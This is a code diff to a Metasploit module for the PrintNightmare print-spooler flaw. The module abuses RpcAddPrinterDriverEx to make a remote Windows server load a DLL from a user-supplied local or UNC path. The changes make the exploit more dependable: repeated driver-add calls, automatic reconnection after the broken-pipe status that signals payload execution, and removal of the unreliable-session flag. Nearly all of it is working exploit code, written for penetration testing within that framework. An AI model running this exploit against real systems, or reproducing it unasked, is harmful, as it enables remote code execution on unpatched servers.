@@ -8,6 +8,7 @@ require 'ruby_smb'
 require 'ruby_smb/error'
 
 module PrintSystem
+  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515
   UUID = '12345678-1234-abcd-ef00-0123456789ab'.freeze
   VER_MAJOR = 1
   VER_MINOR = 0
@@ -262,9 +263,7 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'AKA' => [ 'PrintNightmare' ],
           'Stability' => [CRASH_SAFE],
-          'Reliability' => [
-            UNRELIABLE_SESSION # appears to fail after succeeding once until the server is restarted
-          ],
+          'Reliability' => [],
           'SideEffects' => [
             ARTIFACTS_ON_DISK # the dll will be copied to the remote server
           ]
@@ -274,14 +273,20 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('DLL_PATH', [ true, 'The path to the DLL that the server should load' ])
+        OptString.new('DLL_PATH', [ true, 'The network-based UNC path or local path on the remote target from which the server should load the DLL' ])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptInt.new('ReconnectDelay', [ true, 'A delay in seconds to wait before reconnecting to the named pipe', 10 ])
       ]
     )
   end
 
   def check
     begin
-      connect
+      connect(backend: :ruby_smb)
     rescue Rex::ConnectionError
       return Exploit::CheckCode::Unknown('Failed to connect to the remote service.')
     end
@@ -292,10 +297,8 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Unknown('Failed to authenticate to the remote service.')
     end
 
-    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
-    vprint_status("Binding to #{handle} ...")
     begin
-      dcerpc_bind(handle)
+      dcerpc_bind_spoolss
     rescue RubySMB::Error::UnexpectedStatusCode => e
       nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
       if nt_status == ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
@@ -310,6 +313,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     arch = dcerpc_getarch
+    fail_with(Failure::UnexpectedReply, 'Failed to identify the target architecture.') if arch.nil?
+
     print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")
 
     # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
@@ -318,7 +323,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif arch == ARCH_X86
       environment = 'Windows NT x86'
     else
-      fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported')
+      fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported.')
     end
 
     print_status('Enumerating the installed printer drivers...')
@@ -345,13 +350,16 @@ class MetasploitModule < Msf::Auxiliary
         p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
         p_environment: environment,
         p_driver_path: driver_path,
-        p_data_file: datastore['DLL_PATH'],
-        p_config_file: 'C:\\Windows\\System32\\kernel32.dll'
+        p_data_file: datastore['DLL_PATH']
       )
     )
 
     flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
-    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
+
+    3.times do
+      container.driver_info.p_config_file.assign('C:\\Windows\\System32\\kernel32.dll')
+      add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
+    end
 
     1.upto(3) do |directory|
       container.driver_info.p_config_file.assign("#{config_directory}\\3\\old\\#{directory}\\#{filename}")
@@ -359,19 +367,30 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def dcerpc_bind_spoolss
+    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
+    vprint_status("Binding to #{handle} ...")
+    dcerpc_bind(handle)
+    vprint_status("Bound to #{handle} ...")
+  end
+
   def enum_printer_drivers(environment)
     response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2)
     response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2, p_drivers: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
+    fail_with(Failure::UnexpectedReply, 'Failed to enumerate printer drivers.') unless response.p_drivers&.length
     DriverInfo2.read(response.p_drivers.referent.value.map(&:chr).join)
   end
 
   def get_printer_driver_directory(environment)
     response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2)
     response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2, p_driver_directory: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
+    fail_with(Failure::UnexpectedReply, 'Failed to obtain the printer driver directory.') unless response.p_driver_directory&.length
     RubySMB::Field::Stringz16.read(response.p_driver_directory.referent.value.map(&:chr).join).encode('ASCII-8BIT')
   end
 
   def add_printer_driver_ex(name, container, flags)
+    reconnect = true
+
     begin
       response = rprn_call('RpcAddPrinterDriverEx', p_name: name, p_driver_container: container, dw_file_copy_flags: flags)
     rescue RubySMB::Error::UnexpectedStatusCode => e
@@ -379,7 +398,18 @@ class MetasploitModule < Msf::Auxiliary
       message = "Error #{nt_status.name} (#{nt_status.description})"
       if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN
         # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected
-        vprint_status(message)
+        fail_with(Failure::Disconnected, 'The named pipe connection was broken.') unless reconnect
+        reconnect = false
+
+        print_status("The named pipe connection was broken, reconnecting after a #{datastore['ReconnectDelay'].to_i} second delay.")
+        sleep datastore['ReconnectDelay'].to_i
+        begin
+          dcerpc_bind_spoolss
+        rescue RubySMB::Error::UnexpectedStatusCode => e
+          fail_with(Failure::Unreachable, 'Failed to reconnect to the named pipe.')
+        end
+
+        retry
       else
         print_error(message)
       end
